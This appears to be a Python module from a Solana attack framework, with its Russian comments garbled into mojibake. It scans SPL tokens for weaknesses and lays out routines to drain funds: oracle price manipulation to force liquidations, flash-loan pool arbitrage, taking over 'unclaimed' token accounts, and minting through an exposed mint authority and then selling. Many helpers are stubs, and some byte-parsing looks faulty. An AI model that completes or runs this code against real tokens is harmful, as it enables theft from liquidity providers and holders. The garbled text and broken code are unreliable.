"""
–ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –º–æ–¥—É–ª—å —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ –¥–ª—è SPL —Ç–æ–∫–µ–Ω–æ–≤
–§–æ–∫—É—Å –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç—è—Ö DeFi/DEX
"""

import asyncio
import logging
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass
from datetime import datetime
from enum import Enum

from solders.keypair import Keypair
from solders.pubkey import Pubkey as PublicKey
from solana.rpc.async_api import AsyncClient
from solders.transaction import Transaction
from solders.instruction import Instruction

from .base_exploit import BaseExploit, ExploitResult, ExploitStatus, ExploitType
from ..utils.token_utils import get_token_balance
from ..utils.safety_checks import SafetyChecker

# SPL Token Program ID
TOKEN_PROGRAM_ID = PublicKey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
TOKEN_2022_PROGRAM_ID = PublicKey.from_string("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb")

class TokenVulnerability(Enum):
    """–†–µ–∞–ª—å–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Ç–æ–∫–µ–Ω–æ–≤"""
    OPEN_MINT_AUTHORITY = "open_mint_authority"  # Mint authority –Ω–µ –∑–∞—â–∏—â–µ–Ω
    NO_FREEZE_AUTHORITY = "no_freeze_authority"  # –ú–æ–∂–Ω–æ —Å–≤–æ–±–æ–¥–Ω–æ —Ç–æ—Ä–≥–æ–≤–∞—Ç—å
    DECIMAL_MISMATCH = "decimal_mismatch"  # –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ –¥–µ—Å—è—Ç–∏—á–Ω—ã–µ
    LIQUIDITY_POOL_IMBALANCE = "liquidity_pool_imbalance"  # –î–∏—Å–±–∞–ª–∞–Ω—Å –≤ –ø—É–ª–µ
    PRICE_ORACLE_MANIPULATION = "price_oracle_manipulation"  # –ú–∞–Ω–∏–ø—É–ª—è—Ü–∏—è –æ—Ä–∞–∫—É–ª–æ–º
    UNCLAIMED_TOKENS = "unclaimed_tokens"  # –ù–µ–≤–æ—Å—Ç—Ä–µ–±–æ–≤–∞–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã
    WEAK_SLIPPAGE_PROTECTION = "weak_slippage_protection"  # –°–ª–∞–±–∞—è –∑–∞—â–∏—Ç–∞ –æ—Ç –ø—Ä–æ—Å–∫–∞–ª—å–∑—ã–≤–∞–Ω–∏—è

@dataclass
class TokenExploitConfig:
    """–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –¥–ª—è —Ç–æ–∫–µ–Ω —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤"""
    target_mint: PublicKey
    exploit_type: TokenVulnerability
    max_slippage: float = 0.1  # 10% –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –ø—Ä–æ—Å–∫–∞–ª—å–∑—ã–≤–∞–Ω–∏–µ
    use_flash_loan: bool = False
    flash_loan_amount: Optional[int] = None

class TokenExploitFixed(BaseExploit):
    """
    –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π —ç–∫—Å–ø–ª–æ–π—Ç —Ç–æ–∫–µ–Ω–æ–≤ —Å —Ñ–æ–∫—É—Å–æ–º –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–µ DeFi —É—è–∑–≤–∏–º–æ—Å—Ç–∏
    """
    
    def __init__(self, client: AsyncClient, attacker_keypair: Keypair):
        super().__init__(client, attacker_keypair)
        self.logger.info("üöÄ TokenExploitFixed initialized.")
        
    async def get_mint_info(self, mint_address: Union[PublicKey, str]):
        """–ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ mint —Ç–æ–∫–µ–Ω–∞"""
        if isinstance(mint_address, str):
            mint_address = PublicKey.from_string(mint_address)
        
        try:
            account_info = await self.client.get_account_info(mint_address)
            if not account_info or not account_info.value:
                return None
            
            token_data = account_info.value.data
            if len(token_data) < 82:  # –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä mint account
                return None
            
            # –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ mint
            class MintInfo:
                def __init__(self):
                    self.mint_authority = None
                    self.supply = 0
                    self.decimals = 0
                    self.is_initialized = False
                    self.freeze_authority = None
            
            mint_info = MintInfo()
            
            # –ò–∑–≤–ª–µ–∫–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –∏–∑ –±–∞–π—Ç–æ–≤
            mint_authority_option = token_data[4:36]
            mint_info.supply = int.from_bytes(token_data[36:44], 'little')
            mint_info.decimals = token_data[44]
            mint_info.is_initialized = token_data[45] == 1
            freeze_authority_option = token_data[46:78]
            
            # –û–ø—Ä–µ–¥–µ–ª—è–µ–º authorities
            if mint_authority_option[0] == 1:  # COption::Some
                mint_info.mint_authority = PublicKey.from_bytes(mint_authority_option[1:33])
            
            if freeze_authority_option[0] == 1:  # COption::Some
                mint_info.freeze_authority = PublicKey.from_bytes(freeze_authority_option[1:33])
            
            return mint_info
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ mint: {e}")
            return None
    
    async def scan_token_vulnerabilities(self, target_mint: Union[PublicKey, str]) -> List[TokenVulnerability]:
        """–°–∫–∞–Ω–∏—Ä—É–µ—Ç —Ä–µ–∞–ª—å–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Ç–æ–∫–µ–Ω–∞"""
        vulnerabilities = []
        
        try:
            # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ mint
            mint_info = await self.get_mint_info(target_mint)
            if not mint_info:
                return vulnerabilities
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º mint authority
            if mint_info.mint_authority:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ mint authority –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–º
                if await self._is_unsafe_mint_authority(mint_info.mint_authority):
                    vulnerabilities.append(TokenVulnerability.OPEN_MINT_AUTHORITY)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º freeze authority
            if not mint_info.freeze_authority:
                vulnerabilities.append(TokenVulnerability.NO_FREEZE_AUTHORITY)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–µ—Å—è—Ç–∏—á–Ω—ã–µ –∑–Ω–∞–∫–∏
            if mint_info.decimals == 0 or mint_info.decimals > 18:
                vulnerabilities.append(TokenVulnerability.DECIMAL_MISMATCH)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç—å –∏ –ø—É–ª—ã
            liquidity_pools = await self._find_liquidity_pools(target_mint)
            for pool in liquidity_pools:
                if await self._check_pool_imbalance(pool):
                    vulnerabilities.append(TokenVulnerability.LIQUIDITY_POOL_IMBALANCE)
                    break
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ—Ä–∞–∫—É–ª—ã —Ü–µ–Ω
            if await self._check_oracle_manipulation_potential(target_mint):
                vulnerabilities.append(TokenVulnerability.PRICE_ORACLE_MANIPULATION)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ–≤–æ—Å—Ç—Ä–µ–±–æ–≤–∞–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã
            if await self._find_unclaimed_tokens(target_mint):
                vulnerabilities.append(TokenVulnerability.UNCLAIMED_TOKENS)
                
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π —Ç–æ–∫–µ–Ω–∞: {e}")
            
        return vulnerabilities
    
    async def run_exploit(self, target_pubkey: PublicKey) -> ExploitResult:
        self.logger.warning(f"Exploit 'run_exploit' for {self.exploit_type.value} is not implemented.")
        return ExploitResult(
            exploit_type=self.exploit_type,
            status=ExploitStatus.FAILED,
            target_account=str(target_pubkey),
            error_message="Exploit not implemented yet."
        )

    async def execute_exploit(self, target: Union[PublicKey, str], config: TokenExploitConfig) -> ExploitResult:
        """–í—ã–ø–æ–ª–Ω—è–µ—Ç —ç–∫—Å–ø–ª–æ–π—Ç —Å —Ñ–æ–∫—É—Å–æ–º –Ω–∞ –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ —Å—Ä–µ–¥—Å—Ç–≤ –≤ SOLANA_TARGET_ADDRESS"""
        if isinstance(target, str):
            target = PublicKey.from_string(target)
            
        start_time = asyncio.get_event_loop().time()
        
        try:
            # –ö–†–ò–¢–ò–ß–ù–û: –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –ø–µ—Ä–µ–¥ –ª—é–±–æ–π –æ–ø–µ—Ä–∞—Ü–∏–µ–π
            if not self.safety_checker.is_safe_operation(
                source=str(self.attacker_keypair.pubkey()),
                destination=str(target),
                operation_type="exploit"
            ):
                return ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_account=str(target),
                    error_message="–û–ø–µ—Ä–∞—Ü–∏—è –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏"
                )
            
            # –í—ã–±–∏—Ä–∞–µ–º —Å—Ç—Ä–∞—Ç–µ–≥–∏—é —ç–∫—Å–ø–ª–æ–π—Ç–∞
            result = None
            
            if config.exploit_type == TokenVulnerability.LIQUIDITY_POOL_IMBALANCE:
                result = await self._exploit_pool_imbalance(target, config)
            elif config.exploit_type == TokenVulnerability.PRICE_ORACLE_MANIPULATION:
                result = await self._exploit_oracle_manipulation(target, config)
            elif config.exploit_type == TokenVulnerability.UNCLAIMED_TOKENS:
                result = await self._exploit_unclaimed_tokens(target, config)
            elif config.exploit_type == TokenVulnerability.OPEN_MINT_AUTHORITY:
                result = await self._exploit_open_mint(target, config)
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            if result:
                return ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.SUCCESS,
                    target_account=str(target),
                    transaction_signatures=result.get("signatures", []),
                    extracted_value=result.get("sol_extracted", 0),
                    extracted_tokens=result.get("tokens_extracted", {}),
                    execution_time=execution_time,
                    metadata={
                        "exploit_type": config.exploit_type.value,
                        "used_flash_loan": config.use_flash_loan
                    }
                )
            else:
                return ExploitResult(
                    exploit_type=self.exploit_type,
                    status=ExploitStatus.FAILED,
                    target_account=str(target),
                    error_message="–≠–∫—Å–ø–ª–æ–π—Ç –Ω–µ —É–¥–∞–ª—Å—è",
                    execution_time=execution_time
                )
                
        except Exception as e:
            execution_time = asyncio.get_event_loop().time() - start_time
            return ExploitResult(
                exploit_type=self.exploit_type,
                status=ExploitStatus.FAILED,
                target_account=str(target),
                error_message=str(e),
                execution_time=execution_time
            )
    
    async def _exploit_pool_imbalance(self, pool: PublicKey, config: TokenExploitConfig) -> Optional[Dict[str, Any]]:
        """–≠–∫—Å–ø–ª–æ–π—Ç –¥–∏—Å–±–∞–ª–∞–Ω—Å–∞ –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç–∏"""
        try:
            # 1. –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –ø—É–ª–∞
            pool_state = await self._analyze_pool_state(pool)
            if not pool_state or not pool_state["exploitable"]:
                return None
            
            # 2. –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º –æ–ø—Ç–∏–º–∞–ª—å–Ω—É—é —Å—Ç—Ä–∞—Ç–µ–≥–∏—é –∞—Ä–±–∏—Ç—Ä–∞–∂–∞
            strategy = self._calculate_arbitrage_strategy(pool_state)
            
            # 3. –ï—Å–ª–∏ –Ω—É–∂–µ–Ω flash loan
            if config.use_flash_loan:
                flash_loan_tx = await self._prepare_flash_loan(
                    amount=config.flash_loan_amount or strategy["required_capital"],
                    token=config.target_mint
                )
                if not flash_loan_tx:
                    return None
            
            # 4. –í—ã–ø–æ–ª–Ω—è–µ–º –∞—Ä–±–∏—Ç—Ä–∞–∂
            transactions = []
            
            # –ü–æ–∫—É–ø–∞–µ–º –¥–µ—à–µ–≤–æ
            buy_tx = await self._execute_swap(
                pool=pool,
                token_in=strategy["token_in"],
                token_out=strategy["token_out"],
                amount_in=strategy["amount_in"],
                min_amount_out=strategy["min_amount_out"]
            )
            if buy_tx:
                transactions.append(buy_tx)
            
            # –ü—Ä–æ–¥–∞–µ–º –¥–æ—Ä–æ–≥–æ –Ω–∞ –¥—Ä—É–≥–æ–º –ø—É–ª–µ
            sell_tx = await self._execute_swap(
                pool=strategy["target_pool"],
                token_in=strategy["token_out"],
                token_out=strategy["token_in"],
                amount_in=strategy["amount_out_received"],
                min_amount_out=strategy["expected_profit"]
            )
            if sell_tx:
                transactions.append(sell_tx)
            
            # 5. –í–æ–∑–≤—Ä–∞—â–∞–µ–º flash loan –µ—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏
            if config.use_flash_loan:
                repay_tx = await self._repay_flash_loan(flash_loan_tx["loan_id"])
                if repay_tx:
                    transactions.append(repay_tx)
            
            # –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º –ø—Ä–∏–±—ã–ª—å
            profit = strategy["expected_profit"] - strategy["required_capital"]
            
            return {
                "signatures": [str(tx) for tx in transactions],
                "sol_extracted": 0,  # –ê—Ä–±–∏—Ç—Ä–∞–∂ –≤ —Ç–æ–∫–µ–Ω–∞—Ö
                "tokens_extracted": {str(config.target_mint): float(profit)},
                "strategy": strategy
            }
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –¥–∏—Å–±–∞–ª–∞–Ω—Å–∞ –ø—É–ª–∞: {e}")
            return None
    
    async def _exploit_oracle_manipulation(self, target: PublicKey, config: TokenExploitConfig) -> Optional[Dict[str, Any]]:
        """–≠–∫—Å–ø–ª–æ–π—Ç –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ –æ—Ä–∞–∫—É–ª–æ–º —Ü–µ–Ω"""
        try:
            # 1. –ù–∞—Ö–æ–¥–∏–º –æ—Ä–∞–∫—É–ª –¥–ª—è —Ç–æ–∫–µ–Ω–∞
            oracle = await self._find_price_oracle(config.target_mint)
            if not oracle:
                return None
            
            # 2. –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏
            manipulation_strategy = await self._analyze_oracle_manipulation(oracle)
            if not manipulation_strategy:
                return None
            
            # 3. –ú–∞–Ω–∏–ø—É–ª–∏—Ä—É–µ–º —Ü–µ–Ω–æ–π
            manipulation_tx = await self._manipulate_oracle_price(
                oracle=oracle,
                target_price=manipulation_strategy["target_price"],
                method=manipulation_strategy["method"]
            )
            
            if not manipulation_tx:
                return None
            
            # 4. –ò—Å–ø–æ–ª—å–∑—É–µ–º –º–∞–Ω–∏–ø—É–ª–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Ü–µ–Ω—É –¥–ª—è –ø—Ä–∏–±—ã–ª–∏
            exploit_txs = []
            
            # –ù–∞–ø—Ä–∏–º–µ—Ä, –ª–∏–∫–≤–∏–¥–∏—Ä—É–µ–º –ø–æ–∑–∏—Ü–∏–∏ –ø–æ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ–π —Ü–µ–Ω–µ
            liquidations = await self._find_liquidatable_positions(
                token=config.target_mint,
                manipulated_price=manipulation_strategy["target_price"]
            )
            
            for position in liquidations:
                liquidate_tx = await self._liquidate_position(position)
                if liquidate_tx:
                    exploit_txs.append(liquidate_tx)
            
            # 5. –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Ü–µ–Ω—É –≤ –Ω–æ—Ä–º—É (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
            restore_tx = await self._restore_oracle_price(oracle)
            if restore_tx:
                exploit_txs.append(restore_tx)
            
            return {
                "signatures": [str(manipulation_tx)] + [str(tx) for tx in exploit_txs],
                "sol_extracted": sum(pos["sol_reward"] for pos in liquidations),
                "tokens_extracted": {
                    str(config.target_mint): sum(pos["token_reward"] for pos in liquidations)
                }
            }
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ –æ—Ä–∞–∫—É–ª–æ–º: {e}")
            return None
    
    async def _exploit_unclaimed_tokens(self, target: PublicKey, config: TokenExploitConfig) -> Optional[Dict[str, Any]]:
        """–≠–∫—Å–ø–ª–æ–π—Ç –Ω–µ–≤–æ—Å—Ç—Ä–µ–±–æ–≤–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤"""
        try:
            # 1. –ù–∞—Ö–æ–¥–∏–º –Ω–µ–≤–æ—Å—Ç—Ä–µ–±–æ–≤–∞–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã
            unclaimed = await self._find_unclaimed_token_accounts(config.target_mint)
            if not unclaimed:
                return None
            
            claimed_tokens = 0
            signatures = []
            
            for account in unclaimed:
                # 2. –ü—Ä–æ–≤–µ—Ä—è–µ–º, –º–æ–∂–µ–º –ª–∏ –º—ã –∏—Ö –∑–∞–±—Ä–∞—Ç—å
                if await self._can_claim_tokens(account):
                    # 3. –ó–∞–±–∏—Ä–∞–µ–º —Ç–æ–∫–µ–Ω—ã
                    claim_tx = await self._claim_abandoned_tokens(
                        token_account=account["address"],
                        amount=account["balance"]
                    )
                    
                    if claim_tx:
                        signatures.append(str(claim_tx))
                        claimed_tokens += account["balance"]
            
            if claimed_tokens > 0:
                return {
                    "signatures": signatures,
                    "sol_extracted": 0,
                    "tokens_extracted": {str(config.target_mint): float(claimed_tokens)}
                }
            
            return None
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –Ω–µ–≤–æ—Å—Ç—Ä–µ–±–æ–≤–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤: {e}")
            return None
    
    async def _exploit_open_mint(self, target: PublicKey, config: TokenExploitConfig) -> Optional[Dict[str, Any]]:
        """–≠–∫—Å–ø–ª–æ–π—Ç –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ mint authority"""
        try:
            # 1. –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ mint authority –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ —É—è–∑–≤–∏–º
            mint_info = await self.get_mint_info(config.target_mint)
            if not mint_info or not mint_info.mint_authority:
                return None
            
            # 2. –ü—Ä–æ–≤–µ—Ä—è–µ–º, –º–æ–∂–µ–º –ª–∏ –º—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å mint authority
            if not await self._can_use_mint_authority(mint_info.mint_authority):
                return None
            
            # 3. –ù–ï –ú–ò–ù–¢–ò–ú –ë–ï–°–ö–û–ù–ï–ß–ù–û! –≠—Ç–æ —É–±—å–µ—Ç —Ç–æ–∫–µ–Ω
            # –í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –º–∏–Ω—Ç–∏–º —Ä–∞–∑—É–º–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –¥–ª—è –ø—Ä–æ–¥–∞–∂–∏
            market_cap = await self._estimate_token_market_cap(config.target_mint)
            safe_mint_amount = min(
                market_cap * 0.01,  # –ú–∞–∫—Å–∏–º—É–º 1% –æ—Ç —Ä—ã–Ω–æ—á–Ω–æ–π –∫–∞–ø–∏—Ç–∞–ª–∏–∑–∞—Ü–∏–∏
                1000000  # –ò–ª–∏ 1M —Ç–æ–∫–µ–Ω–æ–≤ –º–∞–∫—Å–∏–º—É–º
            )
            
            # 4. –ú–∏–Ω—Ç–∏–º —Ç–æ–∫–µ–Ω—ã –Ω–∞ –Ω–∞—à –∞–¥—Ä–µ—Å
            our_ata = await self.get_or_create_ata(config.target_mint)
            
            mint_tx = await self._mint_tokens(
                mint=config.target_mint,
                destination=our_ata,
                amount=int(safe_mint_amount),
                authority=mint_info.mint_authority
            )
            
            if not mint_tx:
                return None
            
            # 5. –ü—Ä–æ–¥–∞–µ–º –∑–∞–º–∏–Ω—á–µ–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã
            sell_tx = await self._sell_tokens_safely(
                token=config.target_mint,
                amount=safe_mint_amount,
                min_price_impact=0.05  # –ú–∞–∫—Å–∏–º—É–º 5% –≤–ª–∏—è–Ω–∏–µ –Ω–∞ —Ü–µ–Ω—É
            )
            
            return {
                "signatures": [str(mint_tx), str(sell_tx)] if sell_tx else [str(mint_tx)],
                "sol_extracted": 0,  # –ë—É–¥–µ—Ç –ø–æ—Å–ª–µ –ø—Ä–æ–¥–∞–∂–∏
                "tokens_extracted": {str(config.target_mint): float(safe_mint_amount)}
            }
            
        except Exception as e:
            self.logger.error(f"–û—à–∏–±–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ open mint: {e}")
            return None
    
    # –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ –º–µ—Ç–æ–¥—ã (–∑–∞–≥–ª—É—à–∫–∏ –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã)
    
    async def _is_unsafe_mint_authority(self, authority: PublicKey) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ mint authority –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–º"""
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∏–∑–≤–µ—Å—Ç–Ω—ã–µ —É—è–∑–≤–∏–º—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã
        # –ù–∞–ø—Ä–∏–º–µ—Ä, PDA —Å –ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º—ã–º–∏ seeds
        return False  # –ó–∞–≥–ª—É—à–∫–∞
    
    async def _find_liquidity_pools(self, mint: PublicKey) -> List[PublicKey]:
        """–ù–∞—Ö–æ–¥–∏—Ç –ø—É–ª—ã –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç–∏ –¥–ª—è —Ç–æ–∫–µ–Ω–∞"""
        # –ò—â–µ–º –≤ Raydium, Orca, –∏ –¥—Ä—É–≥–∏—Ö DEX
        return []  # –ó–∞–≥–ª—É—à–∫–∞
    
    async def _check_pool_imbalance(self, pool: PublicKey) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –¥–∏—Å–±–∞–ª–∞–Ω—Å –≤ –ø—É–ª–µ"""
        # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º —Å–æ–æ—Ç–Ω–æ—à–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–æ–≤
        return False  # –ó–∞–≥–ª—É—à–∫–∞
    
    async def _check_oracle_manipulation_potential(self, mint: PublicKey) -> bool:
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ –æ—Ä–∞–∫—É–ª–æ–º"""
        # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º Pyth, Switchboard –æ—Ä–∞–∫—É–ª—ã
        return False  # –ó–∞–≥–ª—É—à–∫–∞
    
    async def _find_unclaimed_tokens(self, mint: PublicKey) -> bool:
        """–ù–∞—Ö–æ–¥–∏—Ç –Ω–µ–≤–æ—Å—Ç—Ä–µ–±–æ–≤–∞–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã"""
        # –ò—â–µ–º –∑–∞–±—Ä–æ—à–µ–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã
        return False  # –ó–∞–≥–ª—É—à–∫–∞


    # –û–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ –º–µ—Ç–æ–¥—ã –∏–∑ –±–∞–∑–æ–≤–æ–≥–æ –∫–ª–∞—Å—Å–∞
    
    @property
    def exploit_type(self) -> ExploitType:
        """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ç–∏–ø —ç–∫—Å–ø–ª–æ–π—Ç–∞"""
        return ExploitType.TOKEN_DRAIN
    
    async def scan_target(self, target: PublicKey) -> List[TokenVulnerability]:
        """
        –°–∫–∞–Ω–∏—Ä—É–µ—Ç —Ç–æ–∫–µ–Ω –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
        
        Args:
            target: –ê–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞ (mint) –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
            
        Returns:
            –°–ø–∏—Å–æ–∫ –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
        """
        vulnerabilities = []
        
        try:
            # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω–µ
            mint_info = await self.client.get_account_info(target)
            if not mint_info.value:
                self.logger.warning(f"Token mint {target} not found")
                return vulnerabilities
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ç–∏–ø—ã —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
            if await self._check_open_mint_authority(target):
                vulnerabilities.append(TokenVulnerability.OPEN_MINT_AUTHORITY)
            
            if await self._check_decimal_mismatch(target):
                vulnerabilities.append(TokenVulnerability.DECIMAL_MISMATCH)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—É–ª—ã –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç–∏
            pools = await self._find_liquidity_pools(target)
            for pool in pools:
                if await self._check_pool_imbalance(pool):
                    vulnerabilities.append(TokenVulnerability.LIQUIDITY_POOL_IMBALANCE)
                    break
            
            if await self._check_oracle_manipulation_potential(target):
                vulnerabilities.append(TokenVulnerability.PRICE_ORACLE_MANIPULATION)
            
            if await self._find_unclaimed_tokens(target):
                vulnerabilities.append(TokenVulnerability.UNCLAIMED_TOKENS)
                
        except Exception as e:
            self.logger.error(f"Error scanning token {target}: {e}")
        
        return vulnerabilities
    
    async def prepare_exploit(self, target: PublicKey, vulnerability: Optional[TokenVulnerability] = None) -> Optional[TokenExploitConfig]:
        """
        –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ—Ç —ç–∫—Å–ø–ª–æ–π—Ç –¥–ª—è —Ç–æ–∫–µ–Ω–∞
        
        Args:
            target: –ê–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞
            vulnerability: –ö–æ–Ω–∫—Ä–µ—Ç–Ω–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å –¥–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏
            
        Returns:
            –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —ç–∫—Å–ø–ª–æ–π—Ç–∞ –∏–ª–∏ None
        """
        if not vulnerability:
            # –°–∫–∞–Ω–∏—Ä—É–µ–º –µ—Å–ª–∏ –Ω–µ —É–∫–∞–∑–∞–Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å
            vulnerabilities = await self.scan_target(target)
            if not vulnerabilities:
                self.logger.warning("No vulnerabilities found")
                return None
            vulnerability = vulnerabilities[0]  # –ë–µ—Ä–µ–º –ø–µ—Ä–≤—É—é –Ω–∞–π–¥–µ–Ω–Ω—É—é
        
        # –°–æ–∑–¥–∞–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –¥–ª—è —ç–∫—Å–ø–ª–æ–π—Ç–∞
        config = TokenExploitConfig(
            target_mint=target,
            exploit_type=vulnerability,
            max_slippage=0.1,
            use_flash_loan=vulnerability in [
                TokenVulnerability.LIQUIDITY_POOL_IMBALANCE,
                TokenVulnerability.PRICE_ORACLE_MANIPULATION
            ]
        )
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ä–∞–∑–º–µ—Ä flash loan –µ—Å–ª–∏ –Ω—É–∂–µ–Ω
        if config.use_flash_loan:
            config.flash_loan_amount = 1000000  # –ó–∞–≥–ª—É—à–∫–∞
        
        return config